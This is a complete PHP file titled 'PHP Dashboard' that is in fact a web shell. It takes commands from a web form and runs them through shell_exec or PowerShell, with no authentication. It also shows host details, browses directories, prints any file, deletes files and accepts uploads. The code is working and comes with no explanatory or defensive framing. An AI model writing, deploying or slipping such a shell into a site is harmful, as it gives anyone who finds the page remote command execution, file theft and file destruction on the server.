<?php
// -------------------- CONFIG --------------------
$cwd = $_POST['cwd'] ?? getcwd();
$cmd = $_POST['cmd'] ?? '';
$mode = $_POST['mode'] ?? 'shell';

// -------------------- DIRECTORY NAVIGATION --------------------
if (isset($_GET['dir'])) {
    $new_dir = $_GET['dir'];
    if (is_dir($new_dir)) {
        $cwd = realpath($new_dir);
    }
}

// -------------------- FILE ACTIONS --------------------
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file)) {
        echo "<h3>Viewing: $file</h3><pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file)) {
        unlink($file);
        echo "<p>Deleted $file</p>";
    }
}

// -------------------- FUNCTIONS --------------------
function sys_info() {
    return [
        'Hostname' => gethostname(),
        'IP' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
        'User' => get_current_user(),
        'OS' => PHP_OS,
        'PHP Version' => PHP_VERSION
    ];
}

function exec_command($cmd, $mode) {
    if (!$cmd) return '';
    if ($mode === 'shell') {
        return shell_exec($cmd . ' 2>&1');
    } elseif ($mode === 'powershell' && strtoupper(substr(PHP_OS,0,3)) === 'WIN') {
        return shell_exec("powershell -Command \"$cmd\" 2>&1");
    } else {
        return "Unsupported mode or OS.";
    }
}

function list_files($dir) {
    $files = scandir($dir);
    $list = [];
    foreach ($files as $f) {
        if ($f !== '.' && $f !== '..') $list[] = $f;
    }
    return $list;
}

// -------------------- HANDLE UPLOAD --------------------
if ($_FILES['upload']['tmp_name'] ?? false) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        echo "<p>Uploaded $dest (" . $_FILES['upload']['size'] . " bytes)</p>";
    } else {
        echo "<p>Upload failed!</p>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Dashboard</title>
    <style>
        body { font-family: monospace; background: #f0f0f0; padding: 10px; }
        pre { background: #fff; padding: 10px; border: 1px solid #ccc; }
        ul { list-style-type: none; padding-left: 0; }
        li { margin: 3px 0; }
        table { margin-top: 10px; }
    </style>
</head>
<body>

<h2>System Info</h2>
<ul>
<?php foreach(sys_info() as $k => $v): ?>
    <li><b><?php echo $k; ?>:</b> <?php echo $v; ?></li>
<?php endforeach; ?>
</ul>

<hr>
<h2>Command Execution</h2>
<form method="post">
    Command: <input type="text" name="cmd" size="60" value="<?php echo htmlspecialchars($cmd); ?>">
    Mode:
    <select name="mode">
        <option value="shell" <?php if($mode==='shell') echo 'selected'; ?>>Shell</option>
        <option value="powershell" <?php if($mode==='powershell') echo 'selected'; ?>>PowerShell</option>
    </select>
    <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
    <input type="submit" value="Run">
</form>

<?php if($cmd): ?>
<h3>Output:</h3>
<pre><?php echo htmlspecialchars(exec_command($cmd, $mode)); ?></pre>
<?php endif; ?>

<hr>
<h2>File Manager: <?php echo htmlspecialchars($cwd); ?></h2>

<ul>
<?php
// Parent directory link
$parent = dirname($cwd);
if ($parent !== $cwd) {
    echo "<li><b>[..]</b> <a href='?dir=" . urlencode($parent) . "'>Go Up</a></li>";
}

// List files/folders
foreach(list_files($cwd) as $file):
    $path = $cwd . DIRECTORY_SEPARATOR . $file;
    if (is_dir($path)) {
        echo "<li>[DIR] <a href='?dir=" . urlencode($path) . "'>$file</a></li>";
    } else {
        echo "<li>$file [<a href='?view=" . urlencode($path) . "'>View</a>] [<a href='?delete=" . urlencode($path) . "'>Delete</a>]</li>";
    }
endforeach;
?>
</ul>

<form method="post" enctype="multipart/form-data">
    Upload file: <input type="file" name="upload">
    <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
    <input type="submit" value="Upload">
</form>

</body>
</html>
